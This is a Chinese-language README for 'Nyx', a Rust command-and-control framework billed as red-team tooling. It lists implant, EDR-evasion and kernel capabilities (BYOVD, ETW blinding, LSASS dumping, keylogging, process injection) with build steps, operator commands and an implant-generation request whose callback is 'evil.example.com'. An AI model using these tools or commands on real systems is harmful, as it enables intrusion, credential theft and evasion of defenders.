# Nyx C2 Framework

> **授权红队 / 渗透测试专用。禁止在未获授权的系统上部署或运行。**

纯 Rust 全栈 C2 框架,融合 Cobalt Strike 的可扩展性与 Brute Ratel 的默认隐蔽性。**所有能力状态以代码核对为准**(本次 README 于 2026-07-18 经 6 路并行代码审计重写,每条声称附 `file:line` 证据)。

> ⚠️ **证据时效（2026-08-09）**：本日一批 B3/CI 修复合并（dumper lea 截断根因 + 5 个连带 bug、smb pivot 回复竞态、qiling CRT IAT、`-D warnings` 门禁合规、bof-host fmt、workflow exit-0）。正文 `file:line` 证据可能滞后数行；**canonical truth 以 `git log --oneline -10` + 实际源码为准**。

> 🚀 **最新进展（2026-08-09，分支 `refactor/ah-audit-followups`）**：
> - **B3 隔离 BOF 链真机全绿**：根因是 PIC dumper 把 lea 引用常量按指针宽度（8B）拷贝，>8B 字符串字面量被截断，导致 bof-host 全部 ntdll 导出解析失败；连带修复 24H2 堆解析（PEB+0x30）、Ldr 走查方向、`NtAllocateVirtualMemory` 6 参等 5 个 bug。真机证据：`nyx_selftest_bof_isolated` exit 7（0b0111）、`bof_print.o` 经牺牲子进程管道回传 `BOF-PRINT-OK`、注入链/syscall_rt 全 PASS。
> - **CI 整体迁移到公有测试仓库**：主仓库（私有）GitHub Actions 因账户 billing/spending limit 全面停用（job 在 runner 分配前秒败）。完整 CI 面已镜像到公有仓库 `qiaozhiyi/nyx-ci-test` 的 `ny-mirror.yml`（12 个 job 覆盖 ci.yml 全部门禁 + windows-ci/g6/p4-p5/kself，经 deploy key 克隆私有源码，公有 runner 免费），最终一轮 **12/12 全绿**；按需触发：`gh workflow run ny-mirror.yml -R qiaozhiyi/nyx-ci-test -f ny_ref=<分支>`，历史 runs/artifacts 用后清空。
> - **Session 0 selftest 限制消除**：hosted runner 上 rundll32 永远到不了导出（v0.3.2 已知限制）——改用 `nyx-bof-isolated-probe` 控制台探针直调导出，9 个 selftest 导出在 hosted runner 上**真跑**（bitmask 全对，`bof_isolated=7`）。
> - **qiling 仿真矩阵 6/6**：`nyx_selftest_env` 的 UcError 根因是新版 nightly/LLVM 的 loop-idiom recognition 发出真 `wcslen` IAT 调用而 qiling 的 ntdll stub 不导出它；`tools/selftest-qiling/runner.py` 新增 CRT IAT shim 修复。
> - **SMB pivot 回复竞态修复**：服务端 drain 等待原为 `PeekNamedPipe` 空操作（探的是 client→server 方向），`DisconnectNamedPipe` 会丢弃客户端未读回复（flake 233）；改 `FlushFileBuffers`（`server/src/smb_listener.rs`）。

> 📋 **完整审计报告**:[`docs/audits/CODE_TRUTH_2026-07-18.md`](docs/audits/CODE_TRUTH_2026-07-18.md)(逐 crate 证据) · [`AUTHORITATIVE_FACTS_2026-07-18.md`](docs/audits/AUTHORITATIVE_FACTS_2026-07-18.md)(数字基准,所有文档统一来源)

**实测规模**:~68,800 行 Rust · 18 workspace 成员 + 6 独立 crate · 488 `#[test]` · 46 个 selftest 导出 · 28 wire `Command` / 7 `Response` 变体。

---

## 功能概览

| 层 | 能力 | 代码实情(2026-07-18 审计) |
|---|---|---|
| **加密协议** | X25519 ECDH + HKDF-SHA256 + ChaCha20-Poly1305;方向隔离 nonce;单调计数器防重放;secrets 零化;contributory X25519(拒绝低阶点/全零共享密钥) | ✅ 完整无弱点(`protocol/src/crypto.rs:222-248,302-319,370-386`) |
| **团队服务器** | tokio/axum HTTP(S);三机制鉴权(bootstrap operator / operators file / legacy token);三角色 RBAC(argon2id);会话/任务队列;SQLite 凭据+implant 库;哈希链审计;Rhai 事件脚本;Malleable C2 profile;implant 生成 | ✅ 完整(`server/src/lib.rs`,14 静态 + 动态 profile 路由) |
| **Windows PIC 植入体** | 29,202 LOC `no_std` DLL;**28** Command 全派发;间接 syscall;9 通道(5 直连 + 4 ExtC2 中转);Module Stomping + ThreadlessInject + Pool Party;HWBP patchless blind;CFG 用户态 bitmap;LACUNA/insomniac/caller-spoof/proxy-veh scanner | ✅ 核心链路完整;**睡眠混淆条件接线**(见已知限制) |
| **内核层 SDK** | BYOVD(Shield/RTCore64/Iqvw64e 可用,WDTKernel 物理内存 stub);ETW-TI blind(4-hop);DKOM 进程隐藏;回调中和+重定向;MiniFilter 解链;PPL stripper;CFG bitmap;LSASS 内核读;minidump 组装;ETW 事件伪造 | ✅ 算法完整 + mock 测试;PatchGuard 偏移未验证 |
| **操作端** | Tauri 2 + React + Three.js 桌面 GUI(3D 网络拓扑 + 语义化命令 + 结构化输出);REST API;2s 轮询增量更新 | ✅ 可用(2026-07-17 接入全部 server 端点);无会话元数据 overlay |
| **脚本 / 扩展** | Rhai 脚本(3 event,资源配额);Malleable C2 profile(c2lint);BOF(CS ABI `go(args,alen)`,W^X 加载,Beacon API 族:`BeaconPrintf`/`BeaconOutput` + datap 解析族 + `BeaconIsAdmin`/`BeaconGetSpawnTo` + kernel32/ntdll externals 表) | ✅ 脚本可用 / ✅ BOF 核心 API 已扩面(token/spawn/inject 类未接) |
| **传输层** | 6 个 `Transport` trait impl（Malleable/DoH/Slack/LLM/MCP/SMB）+ JA3/JA4 计算 | ✅ 4 个 extc2 中继（Slack/LLM/Discord/MCP）全接 boot-time `TransportStack`；DoH 权威应答器、SMB/TCP pivot 父监听已落地（2026-08-03 接线波次） |

---

## 项目结构

```
crates/
├── protocol/              # 加密协议 (X25519+HKDF+ChaCha20-Poly1305, 1,895 LOC, 无 stub)
├── server/                # 团队服务器 (tokio/axum, 5,615 LOC)
├── store/                 # SQLite 凭据/implant/session 库 (1,321 LOC)
├── transport/             # TLS JA3/JA4 + 通道定义 (3,420 LOC, ✅ 4 个 extc2 中继 Slack/LLM/Discord/MCP 全接 server TransportStack;DoH 权威应答器在 server)
├── rest/                  # REST 类型库 (189 LOC, client 共享)
├── parse/                 # shell 输出解析器 (544 LOC)
├── profile/               # Malleable C2 profile 解析 + c2lint (1,733 LOC)
│
├── implant-win/           # Windows PIC 植入体 (no_std, 29,202 LOC, 独立 crate)
│   ├── syscalls.rs        #   间接 syscall runtime (SSN 表 + RX trampoline)
│   ├── unhook.rs          #   KnownDlls fresh ntdll 映射(反 hook 解析)
│   ├── blind_hwbp.rs      #   HWBP patchless blind (VEH 影子桩) ← 默认路径
│   ├── blind.rs           #   AMSI/ETW 字节 patch fallback
│   ├── cfg_user.rs        #   用户态 CFG bitmap 写入
│   ├── lacuna.rs          #   .pdata 间隙扫描
│   ├── stack.rs           #   BYOUD-Gap 栈欺骗 (mov rsp 内联汇编)
│   ├── fluctuation.rs     #   睡眠混淆实现 (🟡 条件接线,见已知限制)
│   ├── sleep.rs           #   Foliage APC 脚手架 (🔴 入口死代码,helpers 存活)
│   ├── inject.rs          #   Module Stomping (默认 arm) + ThreadlessInject
│   ├── tp.rs              #   Pool Party (默认 OFF)
│   ├── channels/          #   9 通道: Https/DohDns/Dns/Smb/Tcp + 4 ExtC2 中转
│   └── selftests.rs       #   46 个 selftest 导出 (feature-gated)
├── operator-kernelsdk/    # 内核 EDR 绕过 SDK (9,791 LOC, 独立 crate)
│   ├── byovd.rs + byovd_drivers/  # BYOVD: Shield / RTCore64 / Iqvw64e / WdtKernel(stub)
│   ├── etwti.rs           #   ETW-TI blind (4-hop)
│   ├── telemetry.rs       #   回调中和 + MiniFilter 解链
│   ├── persistence.rs     #   DKOM 隐藏 + PPL strip + PatchGuard 窗口
│   ├── netsec.rs          #   LSASS 内核读 + CFG bitmap + WfpKit(🟡 永返 Err)
│   ├── etw_deception.rs   #   ETW 事件伪造 (🟡 仅 CLI 调用,无 tier 装配)
│   └── win/ksld.rs        #   LivingOffDefender (优先于 BYOVD)
│
├── operator-kernel-cli/   # 内核 CLI (912 LOC, 5 binary, 含 daemon 模式)
├── offset-resolver/       # ntoskrnl/fltmgr PDB 下载 + 偏移解析 (657 LOC)
├── minidump-assembler/    # LSASS 裸内存 → mimikatz .dmp (469 LOC)
│
├── client-ui-web/         # 操作端 GUI (Tauri 2 + React + Three.js)
│   ├── src-tauri/src/     #   Rust 后端 (~613 LOC, 12 #[tauri::command])
│   └── src/               #   前端 (~4,500 LOC ts/tsx, 含 1001 LOC 拓扑场景)
├── agent-dev/             # macOS/Linux 开发验证植入体 (1,181 LOC, 完整协议循环)
├── bof-runner/            # BOF 加载器 (CS ABI + Beacon API 族(datap/IsAdmin/GetSpawnTo/Output) + kernel32/ntdll externals 表)
├── coff/                  # COFF/AMD64 解析 + 重定位 (365 LOC)
├── evasion/               # syscall 解析 (Hell/Halo/Tartarus Gate, 264 LOC)
├── implant-evasionsdk/    # 植入体逃避算法库 (2,028 LOC, 5/9 trait 有 live impl)
├── scripting/             # 脚本事件总线 (237 LOC)
├── scripting-rhai/        # Rhai 引擎绑定 (166 LOC, 资源配额)
├── config/ + config-macros/  # 编译期加密配置 (ChaCha20-Poly1305, 345 LOC)
├── loader-probe-exe/        # 真机 Layer-2 反射加载探针 (CreateThread 入口,DllMain marker 验证)
└── nyx-loader/              # PIC payload 加密 + 反射加载 (3,210 LOC;pic-loader no_std Layer-2,真机验证 PASS)
```

> **注**:`implant-win` / `operator-kernelsdk` / `operator-kernel-cli` / `minidump-assembler` / `offset-resolver` / `implant-evasionsdk` 共 6 个 crate 是**独立 crate**(不在 workspace,因 no_std/nightly/Windows target 隔离),单独构建。

### 工作量统计(实测)

| 维度 | 数值 | 来源 |
|---|---|---|
| workspace Rust 源码 | 68,751 行 | `find crates -name '*.rs' \| xargs wc -l` |
| workspace 成员 | 18(+6 独立) | `Cargo.toml [workspace] members` |
| `#[test]` / `#[tokio::test]` | 488 | 含独立 crate;`cargo test --workspace` 跑 267(workspace 内) |
| selftest 导出 | 46 | `implant-win/src/selftests.rs`(`#[cfg(feature="selftest")]`) |
| wire `Command` 变体 | **28** | `protocol/src/msg.rs:130` |
| wire `Response` 变体 | 7 | `protocol/src/msg.rs:560` |
| GUI 命令(已解析) | 36 | `client-ui-web/src/components/CommandInput.tsx` |
| server 路由 | 14 静态 + 7 beacon + 6 kernel(条件) + 动态 profile | `server/src/lib.rs:716-779` |
| BYOVD 驱动 | 3 可用 + 1 stub | `operator-kernelsdk/src/byovd_drivers/` |
| Windows build 覆盖 | 8 已知行 + 6 patch-equiv 映射 = 4 distinct layouts | `implant-evasionsdk/src/offsets_table.rs` |

---

## 环境要求

| 工具 | 版本 | 用途 |
|---|---|---|
| Rust stable | ≥ 1.80 | 服务端 / 客户端 / 支撑 crate(workspace 默认) |
| Rust nightly | — | 植入体(`implant-win`,`no_std`) |
| `x86_64-pc-windows-gnu` target | — | 植入体交叉编译 |
| `mingw-w64` | 16.1.0 推荐 | Windows 交叉链接器 |
| Node.js | ≥ 18 | GUI 前端构建 |
| Windows Server 2019+ | — | 植入体真机运行 |

```bash
rustup target add x86_64-pc-windows-gnu
rustup toolchain install nightly
rustup component add rust-src --toolchain nightly
```

---

## 快速上手

### 1. 启动团队服务器

```bash
# 开发模式 (loopback HTTP, 无鉴权, 临时密钥对)
cargo run --release -p nyx-server

# 生产模式 (持久密钥 + Bearer + TLS)
NYX_BIND=0.0.0.0:8443 \
NYX_KEYFILE=~/.nyx/server.key \
NYX_BOOTSTRAP_OPERATOR=admin:your_secret \
NYX_TLS=on \
cargo run --release -p nyx-server
```

> `NYX_BIND` 默认 `127.0.0.1:8443`(loopback)。非 loopback 绑定且无鉴权时,服务器自动生成一次性 token 并打印;设 `NYX_ALLOW_OPEN=1` 才允许开放模式。

服务器启动后输出 X25519 公钥(hex),烤入植入体构建。

### 2. 构建 dev 植入体(macOS/Linux 协议验证)

```bash
export NYX_SERVER=http://127.0.0.1:8443
export NYX_SERVER_PUB=<服务器输出的公钥 hex>
cargo run --release -p nyx-agent-dev
```

`agent-dev` 跑完整加密协议循环(check-in / task / execute / return),Windows-only 原语(StealToken/Inject/Trex/Keylog 等)返回 `Response::Err`。

### 3. 构建 Windows PIC 植入体

> ⚠️ **implant-win 是独立 crate,不在 workspace 里。** 必须在它的目录内构建,不能用 `-p nyx-implant-win`。

```bash
# 检查编译(从仓库根目录)
(cd crates/implant-win && cargo +nightly check --target x86_64-pc-windows-gnu)

# Release 构建
(cd crates/implant-win && cargo +nightly build --release \
  --target x86_64-pc-windows-gnu -Z build-std=core,alloc)
```

输出 `target/x86_64-pc-windows-gnu/release/nyx_implant_win.dll`。

> **编译期 gate**(均为 `option_env!`,默认值见下表):
> - `NYX_FLUCTUATION_OFF=1` — 关闭 Fluctuation 睡眠掩码(退到纯 sleep)。**注:默认开启**;`kits::sleep` 在 `evasion_active() && fluctuation::enabled()` 时路由 `fluctuation::sleep`(`kits.rs:75-81`),fluctuation 内部失败时降级纯 sleep(`fluctuation.rs:25-33`),noevasion 模式跳过掩码。
> - `NYX_SPOOF_OFF=1` — 关闭栈欺骗(CET-off 主机默认自动 arm,`entry.rs:137-153`)
> - `NYX_TLS_INSECURE=1` — 放宽 WinHTTP 证书校验(默认 OFF)。`WinHttpSetOption` 在 `WinHttpSendRequest` **之前**调用(`transport.rs:332-353`)。
> - `NYX_POOL_PARTY_ON=1` — 开启 Pool Party 注入(默认 OFF)
> - `NYX_SKIP_SANDBOX=1` — 跳过沙箱检测(SYSTEM 部署时;**注意此项是运行时 env,非编译期**)

### 4. 启动操作端 GUI (Tauri 2 + React)

```bash
cd crates/client-ui-web
npm install          # 首次:装前端依赖
npm run tauri dev    # 启动(自动连 http://127.0.0.1:8443,在连接页输入 bearer)
```

> GUI 含 3D 网络拓扑(Three.js,UnrealBloom 后处理 + 射线点击选中)、语义化命令输入、结构化任务输出、2s 增量轮询。纯前端开发(不启 Tauri 外壳):`npm run dev`。

### 5. 服务器侧生成 implant

```bash
# REST API
curl -X POST http://127.0.0.1:8443/api/generate-implant \
  -H "Authorization: Bearer admin:your_secret" \
  -H "Content-Type: application/json" \
  -d '{"callback":"evil.example.com","port":443,"format":"dll"}'
```

服务器 patch DLL 模板(每 implant 独立 X25519 keypair + config 加密 + 一次性 auth_token),`NYX_TEMPLATE` 指向模板路径。速率限制 10/hr/target(`implant_gen.rs`)。

---

## 服务器环境变量

| 变量 | 默认 | 说明 |
|---|---|---|
| `NYX_BIND` | `127.0.0.1:8443` | 监听地址 |
| `NYX_KEYFILE` | —(每次随机) | 持久 X25519 私钥(0600)。session 元数据经 SQLite 持久化层落盘(`NYX_CREDS` 库,boot 恢复,`server/src/lib.rs:250-336`) |
| `NYX_TOKEN` | — | legacy 共享 Bearer(Admin);优先级低于 operators file |
| `NYX_BOOTSTRAP_OPERATOR` | — | `name:secret` 首个 Admin(argon2id 哈希,`operators.rs:127-158`) |
| `NYX_OPERATORS_FILE` | `~/.nyx/operators.json` | 操作员注册表 |
| `NYX_KILLDATE` | —(永不过期) | Unix 时间戳,过期拒绝所有 beacon(`main.rs:44-59`);implant 生成侧 kill-date 严格校验(ISO 8601/`YYYY-MM-DD`,闰年+当月天数+年≥1970+checked 算术,`implant_gen.rs:258-268,340-374`) |
| `NYX_TLS` | off | 任意值启用 rustls HTTPS |
| `NYX_CERT` / `NYX_KEY` | — | PEM 证书/密钥(需同时设) |
| `NYX_PROFILE` | — | Malleable C2 profile(c2lint 在加载时验证) |
| `NYX_SCRIPT` | — | Rhai 事件脚本(`on_session_new` / `on_result` / `on_session_exit`) |
| `NYX_CREDS` | `~/.nyx/server-creds.db` | 凭据+implant+session SQLite 路径 |
| `NYX_AUDIT_LOG` | `~/.nyx/audit.jsonl` | 审计日志(哈希链,`audit.rs:106-261`) |
| `NYX_TEMPLATE` | — | implant DLL 模板路径(启用生成) |
| `NYX_KERNEL_DAEMON` | — | `host:port` 内核 daemon;设后注册 `/api/kernel/*` 路由;配合 `NYX_KERNEL_DAEMON_TOKEN` 使用 |
| `NYX_KERNEL_DAEMON_TOKEN` | —(bridge 必需) | server→daemon 共享密钥:bridge 每连接首行发 `auth <token>`(daemon 答 `{"ok":true}`);缺省时 bridge 拒绝 op(`server/src/kernel.rs:32,88-98`;镜像 daemon 侧 `NYX_DAEMON_TOKEN`) |
| `NYX_ALLOW_OPEN` | — | `=1` 允许非 loopback 开放模式 |
| `NYX_SESSION_MAX_AGE` | `604800`(7d) | session 年龄 GC(豁免近期活跃会话) |
| `NYX_SESSION_MAX_IDLE` | `86400`(24h) | session 空闲 GC |
| `NYX_EXTC2_SLACK_TOKEN` / `NYX_EXTC2_SLACK_CHANNEL` | — | Slack ExtC2 中转(bot token + channel);与 HMAC key 三者齐备才启用 |
| `NYX_EXTC2_SLACK_HMAC_KEY` | —(**启用 Slack 时必需**) | Slack 中转帧 HMAC 密钥(hex,32B);启用 Slack 中转而缺省/非 hex/全零 → **boot 失败**(fail-closed,`extc2_relay.rs:381-413`) |
| `NYX_EXTC2_MCP_URL` / `NYX_EXTC2_MCP_SESSION` | — | MCP ExtC2 中转(server URL + session) |
| `NYX_DAEMON_TOKEN` | —(内核 daemon 必需) | 内核 daemon 共享密钥:`--serve` 无此变量 exit 7;每连接首行必须 `auth <token>`(constant-time 比较,daemon 答 `{"ok":true}`;`operator-kernel-cli/src/main.rs:161-177,552-556`) |

---

## GUI 命令速查

操作端为 Tauri 桌面 GUI(旧 ratatui TUI / Makepad GUI 已于 commit `c5064dc` 归档)。命令输入框解析 **36 个命令**(`CommandInput.tsx:213-509`),全部映射到 `POST /api/task`。session 元数据(rename/tag/star/alias)**尚未接入 GUI**。

### 会话 / 侦察

```
ping                    存活探测
sleep <s> [jitter]      调整睡眠
screenshot              屏幕截图(BMP,跨会话)
screenwatch             持续截屏(3 帧)
driveinfo               驱动器信息
env [NAME]              环境变量
clipboard               剪贴板
net                     ifconfig/netstat/arp
portscan <host> <ports> TCP 端口扫描
```

### 文件操作

```
ls [path]               目录列表
cd / mkdir / rm         文件系统操作
mv / cp                 移动 / 复制
upload <local> <remote>   上传
download <remote>       下载(64KB 分块)
```

### 执行 / 权限

```
shell <cmd>             cmd.exe /c 或 sh -c
bof <hex> [args...]     BOF 执行(CS ABI,args 透传,Beacon API 族 + kernel32/ntdll externals)
bof <hex> isolate [...] 隔离 BOF:牺牲子进程 bof-host 执行,崩溃不拖垮 beacon(等价 bof-iso <hex> [...])
exit                    退出 implant
getuid                  当前用户
stealtoken <pid>        窃取 token(Windows)
maketoken <u> <d> <p>   制作 token
rev2self                还原 token
```

### 凭据 / 控制 / 隧道

```
hashdump [method]       SAM/SYSTEM hash 提取(method=3 macOS shadow-hash)
keylog <start|dump>     键盘记录(Windows)
inject <pid> <hex> [m]  进程注入(m: 0=PoolParty/OFF→stomp, 1=ThreadlessHWBP, 2=stomp)
connect <host> <port>   TCP 反向端口转发
socks <port>            SOCKS5 relay
setchannel <ch>         切换 C2 通道
channeldata <ch> <hex>  向中继通道写原始字节(SOCKS/rportfwd 回写,hex 须偶数长)
chanwrite <ch> <text>   同 channeldata,载荷按 UTF-8 文本自动转 hex
channelclose <id>       关闭通道
trex                    T-REX EDR 评估分级
```

---

## 内核层操作

内核能力通过独立 CLI 操作(需 Windows + 管理员),或通过 team server 的 `/api/kernel/*` 中转(需先启 daemon):

```bash
# 内核 CLI(独立 crate)
(cd crates/operator-kernel-cli && cargo run --release --)

# 子命令: bootstrap / blind-etw / hide <pid> / dump-lsass <pid> \
#         neutralize <pid> <freeze|choke|kill> / detach-minifilter \
#         pg-window / cfg-bypass / forge-etw / --serve <port>(daemon 模式)
```

`--serve <port>` 启动 TCP JSON-line daemon(每连接独立线程,单行 ≤ 16 KiB,60 ops/min 限速),team server 设 `NYX_KERNEL_DAEMON=127.0.0.1:<port>` 后会注册 `/api/kernel/{status,blind-etw,hide,dump-lsass,neutralize,detach-minifilter}` 6 个路由。daemon 要求 `NYX_DAEMON_TOKEN`(缺省 exit 7),每连接首行必须 `auth <token>`(答 `{"ok":true}`);server bridge 侧以 `NYX_KERNEL_DAEMON_TOKEN` 镜像该密钥(`server/src/kernel.rs:32`),`neutralize` op 带 `method: freeze|choke|kill`。

### 偏移自动解析

```bash
# 从 MS Symbol Server 下载 ntoskrnl.pdb 解析偏移
(cd crates/offset-resolver && cargo run --release -- \
    --ntoskrnl C:\Windows\System32\ntoskrnl.exe --out offsets.toml)

# 或从 fltmgr.pdb 解析 FltGlobals RVA(--build 为必需参数,无则拒绝运行)
(cd crates/offset-resolver && cargo run --release -- \
    --fltmgr C:\Windows\System32\drivers\fltmgr.sys --build 17763 --out flt.toml)
```

无 PDB 时回退到内置偏移表(`implant-evasionsdk/src/offsets_table.rs`,8 个已知 build 号 + 6 个 patch-equivalent 映射 = 4 种 distinct EPROCESS/ETW 布局;19041=20348=22000=22621=22631、26200=26100 共享布局)。

---

## 线网协议

```
[4B frame magic "NYX1"][1B dir][8BE u64 counter][4BE u32 ct_len][12B nonce][N ct][16B Poly1305 tag]
```

- **方向隔离 nonce**:dir 字节(0=client→server, 1=server→client)分离两套计数器空间(`crypto.rs:383-408`)
- **防重放**:单调计数器 + 写守卫 TOCTOU 关闭(`server/src/lib.rs`)
- **分配炸弹防护**:`decode_vec` 拒绝 declared count > 65536,且不超过剩余字节(`msg.rs:35-41`)
- **blob 长度上限**:`MAX_BLOB_LEN` = 256 KiB;frame `MAX_CT_LEN` = 512 KiB

完整 28 Command + 7 Response 的 wire 编解码见 `protocol/src/msg.rs`,round-trip 测试在 `protocol/tests/roundtrip.rs`。

---

## 构建与测试

```bash
# 工作区构建(服务端 + 客户端 + 支撑 crate)
cargo build --workspace

# 工作区测试(约 267 个)
cargo test --workspace

# 植入体检查(nightly + Windows target,需 cd 进独立 crate)
(cd crates/implant-win && cargo +nightly check --target x86_64-pc-windows-gnu)

# 内核 SDK 测试(独立 crate,全 mock + 作战链场景;macOS 137/137,Windows 经 wine64 154/154,两平台并集 162 全过)
(cd crates/operator-kernelsdk && cargo test)

# 独立 crate 测试
for c in implant-evasionsdk evasion coff config config-macros minidump-assembler nyx-loader bof-runner; do
  (cd crates/$c && cargo test)
done

# Malleable C2 profile 验证
cargo run -p nyx-profile --bin c2lint -- <profile>

# lint
cargo clippy --workspace --all-targets
```

### CI(2026-08-09 起:公有测试仓库镜像)

主仓库(私有)的 GitHub Actions 因账户 billing/spending limit 已停用(job 在 runner 分配前即失败,非代码问题)。完整 CI 面镜像在公有仓库 **`qiaozhiyi/nyx-ci-test`**:

```bash
# 全量验证(12 个 job:ci.yml 全部门禁 + windows-ci 植入体全链 + g6 24H2 内核
# + p4-p5 userland + kself;windows-latest = Server 2025 = 26100 内核)
gh workflow run ny-mirror.yml -R qiaozhiyi/nyx-ci-test -f ny_ref=<分支/SHA>

# B3 隔离 BOF 专用验证链
gh workflow run b3-verify.yml -R qiaozhiyi/nyx-ci-test -f ny_ref=<分支/SHA>
```

镜像 workflow 经只读 deploy key 克隆本私有仓库,在免费公有 runner 上执行与 `.github/workflows/` 相同的步骤;hosted runner 上的用户态 selftest 不再跳过——由 `nyx-bof-isolated-probe` 控制台探针直调导出(Session 0 安全)。用完即清空历史 runs/artifacts,workflow 文件常驻备用。`windows-byovd-hosted.yml` 未镜像(需预置 RTCore64.sys + HVCI 关闭,hosted runner 上本就自我跳过)。

---

## 已知限制(代码核对实情,2026-07-18)

| 项 | 代码实情 | 证据(file:line) |
|---|---|---|
| **睡眠混淆 Fluctuation** | 🟡 **条件接线(受限交付)** | `kits::sleep` 在 `evasion_active() && fluctuation::enabled()` 时路由 `fluctuation::sleep`(`kits.rs:75-81`);fluctuation 默认开启(`NYX_FLUCTUATION_OFF=1` 关闭,`fluctuation.rs:11-15`),失败降级纯 sleep(`fluctuation.rs:25-33`);noevasion 模式(`set_evasion_off`)跳过掩码。Foliage helper-thread `.text` 掩码路径仍休眠(`mem.rs:249-253`)。 |
| **Foliage APC .text 加密** | 🔴 入口死代码,helpers 存活 | `sleep::sleep()` 零调用方(beacon 循环走 `kits::sleep` → `fluctuation::sleep`,`sleep.rs:79-91`);helpers(`own_text_region`/`raw_create_thread`/`FoliageRaw` 等)仍被 fluctuation/evasion_glue/keylog 等使用(`sleep.rs:84`)。 |
| **transport/ crate** | 🟡 **全接线(受限交付)** | 4 个第三方 API 中继(Slack/LLM/Discord/MCP)经 boot-time `TransportStack` 由 server 中转(`extc2_relay.rs`,均 HMAC fail-closed);DoH 信道由 server 权威 DNS 应答器(`server/src/dns_responder.rs`,RFC 8484 JSON + UDP/53)支撑,`agent-dev --channel doh` 消费 `DohDnsTransport`;SMB/TCP pivot 父监听在 server(`smb_listener.rs` Windows-only / `tcp_pivot.rs`);TLS emitter 由 `nyx-agent-dev` `impersonation` feature 消费(CI Gate 7)。implant 侧保持自滚 WinHTTP 通道(no_std PIC 设计)。 |
| **TLS 指纹 emitter** | 🟡 **feature 门控(实验性)** | `impersonation` feature 下返回真实 BoringSSL(`wreq`)客户端(`fingerprint.rs:201-211`;`Cargo.toml [features]`);默认(hermetic)构建仍返 `Err(BackendUnavailable)`(`fingerprint.rs:225-229`)。未接入 server 出站链路。 |
| **caller-spoof** | 🟡 **已实现(受限交付)** | `call_with_spoofed_return!` 宏 + 函数形式已存在(`caller_spoof.rs:464-499`);CET 探测自门:检测到 CET 时降级 `call_plain`(`caller_spoof.rs:36-41,212-229`)。 |
| **proxy_veh 注册路径** | 🟡 未用 | `register_section_backed_handler` 完整实现(KnownDlls SEC_IMAGE + code cave trampoline),但 HWBP 路径直接用 `AddVectoredExceptionHandler`。gadgets 扫描后未消费。 |
| **Pool Party 注入** | 🟡 完整但默认 OFF(受限交付) | `tp.rs` 全实现(section 投递 + worker-factory 劫持 + `_TP_DIRECT` splice),仅 `NYX_POOL_PARTY_ON=1 && method=0 && pid!=0` 时触发。本次修复 `SYSTEM_HANDLE_INFORMATION_EX` 布局(count@0/stride 0x28/handle@0x10/pid@0x08)+ synthetic-buffer 测试。 |
| **BOF 兼容面** | 🟡 **受限交付(Beacon API 已扩面)** | Beacon API 面:`BeaconPrintf`/`BeaconOutput` + `datap` 解析族(`BeaconDataParse`/`BeaconDataInt`/`BeaconDataShort`/`BeaconDataLength`/`BeaconDataExtract`,misaligned 安全)+ `BeaconIsAdmin`(advapi32 TokenElevation)+ `BeaconGetSpawnTo`(`bof-runner/src/shim.rs`,`layout::BEACON_APIS` 注册);+ `GetModuleHandleA/GetProcAddress` 解析的 kernel32/ntdll 常用导出(`bof-runner/src/win.rs`);W^X:代码段 reloc 后 `VirtualProtect(RX)` 再 `go()`;CS ABI `go(args,alen)` + NULL fallback;内存经 RAII guard 于 `go()` 返回后释放。wine64 实测:datap 全 API 解析回显正确、admin/spawn/raw 输出正确、未实现 API 报 `unresolved external symbol` 带名报错(2026-08-10)。仍未接:token/spawn/inject 类(`BeaconUseToken`/`BeaconSpawnTemporaryProcess`/`BeaconInjectProcess` 等)。 |
| **WfpKit(内核)** | 🔴 装配但永失败 | `netsec.rs:block_outbound_for_pid` 永返 Err(拒绝零条件 filter);`assemble_tier` 设 `wfp: None`。**注:implant-win 中无任何 WFP 代码**(grep 零命中)。 |
| **PatchGuard bypass** | 🟡 偏移未验证 | `persistence.rs:550-720` 用 valid_flag 置零法,偏移 `prcb_pg_thread=0x190`/`valid=0x08` 代码自标需 PDB 验证。非 Outflank Peekaboo 法。 |
| **EdrNeutralizer::kill** | 🟡 仅 resolve | 只解析 EPROCESS KVA,不终止目标进程。 |
| **WdtKernel 驱动** | 🟡 stub | 物理内存 r/w(0x9C412420/0x9C41242C)真,但 VA `raw_rw` 永返 `Err(0)`。 |
| **etw_deception 事件伪造** | 🟡 死路径 | 完整实现,但无 tier 装配;仅 `operator-kernel-cli forge-etw` 子命令调用。 |
| **nyx-loader 反射加载** | ✅ **已交付(真机验证)** | 真实 Layer-2(pic-loader no_std PIC,`crates/nyx-loader/pic-loader/`)已接线:`wrap_payload` 按最终布局发射 `[LAYER1+bridge][key][magic\|len\|nonce][ct\|\|tag][LAYER2]`(`nyx-loader/src/lib.rs`);**真机 E2E 探针 PASS**(`crates/loader-probe-exe`):CreateThread 线程入口执行完整 blob,fixture 与真实 implant DLL 均反射加载成功、DllMain 执行(marker 证实)、返回 0——在免费 GitHub 托管 windows-latest runner 上运行,零本地硬件;Unicorn 仿真探针(CI Gate 5)+ Qiling selftest 门禁(CI Gate 6)守护回归。 |
| **implant-evasionsdk trait** | 🟡 5/9 trait 有 live impl(受限交付) | `implant-win/src/evasion_glue.rs` 提供 5 个 live impl:`PdataGapScanner`(LivePdataScanner,`evasion_glue.rs:44`)/`StackSpoofKit`(LiveStackSpoof,`evasion_glue.rs:174`)/`BlindKit`(LiveBlind,`evasion_glue.rs:210`)/`MemoryMaskKit`(LiveMemoryMask,`evasion_glue.rs:274`)/`ProcessInjectKit`(ModuleStomper,`evasion_glue.rs:316`);`SleepmaskKit` 由 kits.rs 的 Foliage/NoMask 提供(`kits.rs:43-61`)。其余 3 trait(`SyscallSource`/`UnhookKit`/`AntiDebugKit`)保持 `Floors` no-op(`lib.rs:366-413`)。算法子模块(gap/frame/rc4/foliage/apc/swap/offsets_table)真且测试;`offsets_table` 已标记 canonical + pub accessor(`offsets_table.rs:39-44,296,335`),operator-kernelsdk/offset-resolver dev-dep 一致性测试。 |
| **`mask_secret()`** | ✅ **已修复** | char-based `first2….last2` 掩码 + 非 ASCII 测试(`store/src/model.rs:73-82,108-119`)。 |
| **SQLite migration** | 🟡 **部分(受限交付)** | schema_version 迁移机制已启用:session_store v→v+1 `ADD COLUMN send_counter/last_recv`;其余表仍以 `CREATE TABLE IF NOT EXISTS` 基线为主。 |
| **`created_by` 归因** | ✅ **已接** | `created_by: Some(op.name.clone())`(`implant_gen.rs:917`);生成端点带鉴权解析操作员(open 模式映射 Viewer 并拒绝写端点,`implant_gen.rs:988-992`)。 |
| **fallback 链** | 🟡 短 | 只有 `Https → DohDns → Dns`(`channels/mod.rs:259`)。 |
